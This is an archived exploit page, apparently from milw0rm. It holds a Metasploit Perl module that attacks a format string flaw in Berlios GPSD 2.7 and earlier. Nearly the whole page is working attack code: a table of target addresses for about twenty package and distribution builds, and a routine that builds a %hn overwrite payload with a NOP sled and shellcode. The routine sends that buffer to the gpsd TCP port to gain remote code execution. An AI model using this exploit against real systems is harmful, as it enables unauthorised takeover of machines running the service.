<html><head><title>Berlios GPSD <= 2.7 Remote Format String Exploit (meta)</title></head><pre>package Msf::Exploit::gpsd_format_string;
use base &quot;Msf::Exploit&quot;;
use strict;
use Pex::Text;
use IO::Socket;

my $advanced = { };

my $info = {
    'Name'     =&gt; 'Berlios GPSD Format String Vulnerability',
    'Version'  =&gt; '$ 1.0 $',
    'Authors'  =&gt; [ 'Enseirb &lt;senotier [at] enseirb.fr&gt;', ],
    'Arch'     =&gt; [ 'x86' ],
    'OS'       =&gt; [ 'linux' ],
    'Priv'     =&gt; 1,
    
    'UserOpts' =&gt;
    {
	'RHOST' =&gt; [1, 'ADDR', 'The target address'],
	'RPORT' =&gt; [1, 'PORT', 'The target port', 2947],
		
    },
    
    'Payload' =&gt;
    {
	'Space'    =&gt; 1004,
	'BadChars' =&gt; &quot;\x00\x0a\x0d\x0c&quot;,
    },
    
    'Targets' =&gt;
	
	[
	 [ &quot;gpsd-1.91-1.i386.rpm&quot;, 0x0804f250,0x41424344 ], # .rpms Tested on Redhat 9.0
	 [ &quot;gpsd-1.92-1.i386.rpm&quot;, 0x0804f630,0x41424344 ],
	 [ &quot;gpsd-1.93-1.i386.rpm&quot;, 0x0804e154,0x41424344 ],
	 [ &quot;gpsd-1.94-1.i386.rpm&quot;, 0x0804f260,0x41424344 ],
	 [ &quot;gpsd-1.95-1.i386.rpm&quot;, 0x0804f268,0x41424344 ],
	 [ &quot;gpsd-1.96-1.i386.rpm&quot;, 0x41424344,0x41424344 ],
	 [ &quot;gpsd-1.97-1.i386.rpm&quot;, 0x0804b14c,0x41424344 ],
	 [ &quot;gpsd-2.1-1.i386.rpm&quot;, 0x0804c7a0,0x41424344 ],
	 [ &quot;gpsd-2.2-1.i386.rpm&quot;, 0x0804c7a0,0x41424344 ],
	 [ &quot;gpsd-2.3-1.i386.rpm&quot;, 0x0804c730,0xbfffd661 ],
	 [ &quot;gpsd-2.4-1.i386.rpm&quot;, 0x0804c7b8,0xbfffde71 ],
	 [ &quot;gpsd-2.5-1.i386.rpm&quot;, 0x0804c7dc,0xbfffdc09 ],
	 [ &quot;gpsd-2.6-1.i386.rpm&quot;, 0x0804c730,0xbffff100 ],
	 [ &quot;gpsd-2.7-1.i386.rpm&quot;, 0x0804c5bc,0xbfffcabc ],
	 [ &quot;gpsd_2.6-1_i386.deb&quot;, 0x0804c7c4,0xbfffedc8 ], 
	 [ &quot;gpsd_2.7-1_i386.deb&quot;, 0x0804c6c4,0xbfffc818 ],
	 [ &quot;gpsd_2.7-2_i386.deb&quot;, 0x0804c770,0xbfffee70 ],
	 [&quot;SuSE 9.1 compiled 2.0&quot;, 0x0804c818,0xbfffe148 ], 
	 [ &quot;Slackware 9.0 compiled 2.0&quot;, 0x0804b164,0xbfffd7d6 ],
	 [ &quot;Slackware 9.0 compiled 2.7  &quot;, 0x0804c3ec,0xbfffe65c ], 
	 [ &quot;Debug              &quot;, 0x41424344,0xdeadbeef ], 
	 ],


    'Description' =&gt;
	Pex::Text::Freeform(qq{
	    This module exploits a format string vulnerability in the Berlios GPSD server.
		This vulnerability was discovered by Kevin Finisterre.
	    }),
		
    'Keys' =&gt; ['gpsd'],
		
		'DisclosureDate' =&gt; 'May 25 2005',
		
	    };

sub new {
    my $class = shift;
    my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
    return($self);
}

sub Exploit {
    my $self = shift;
    my $target_idx  = $self-&gt;GetVar('TARGET');
    my $target_host = $self-&gt;GetVar('RHOST');
    my $target_port = $self-&gt;GetVar('RPORT');
    my $shellcode   = $self-&gt;GetVar('EncodedPayload')-&gt;Payload;
    my $target = $self-&gt;Targets-&gt;[$target_idx];
    
    $self-&gt;Print(&quot;[*] Reading information from target &quot; . $target_host . &quot;: &quot;);
        
    my $offset = 17;
    my $dump_fmt = 7;
    my $al = 3;
    my ($hi,$lo);
    my ($shift0,$shift1);
    my $buf;
    
    $hi = ($target-&gt;[2] &gt;&gt; 0) &amp; 0xffff;
    $lo = ($target-&gt;[2] &gt;&gt; 16) &amp; 0xffff;

    $shift0 = sprintf(&quot;%d&quot;,$hi) - sprintf(&quot;%d&quot;,$offset) - ($dump_fmt * 8 + 16 + $al);
    $shift1 = (sprintf(&quot;%d&quot;,0x10000) +  sprintf(&quot;%d&quot;,$lo)) - sprintf(&quot;%d&quot;,$hi);

    $buf  = &quot;A&quot; x 3 . &quot;B&quot; x 4; 
    $buf .=  pack('V',$target-&gt;[1]);
    $buf .= &quot;B&quot; x 4;
    $buf .=  pack('V',$target-&gt;[1] + 0x2);
    $buf .= &quot;%.8x&quot; x7 .&quot;%.&quot;.$shift0.&quot;lx%hn&quot;.&quot;%.&quot;.$shift1.&quot;lx%hn&quot;;
    $buf .= $self-&gt;MakeNops(3000) . $shellcode ; 
    
    my $s = Msf::Socket::Tcp-&gt;new
	(
	 'PeerAddr'  =&gt; $target_host,
	 'PeerPort'  =&gt; $target_port,
	 );
    
    if ($s-&gt;IsError) {
	$self-&gt;PrintLine('[*] Error creating socket: ' . $s-&gt;GetError);
	return;
    }
    
    $s-&gt;Send($buf);
    $s-&gt;Close();

	return;
}

1;

# milw0rm.com [2007-01-08]</pre></html>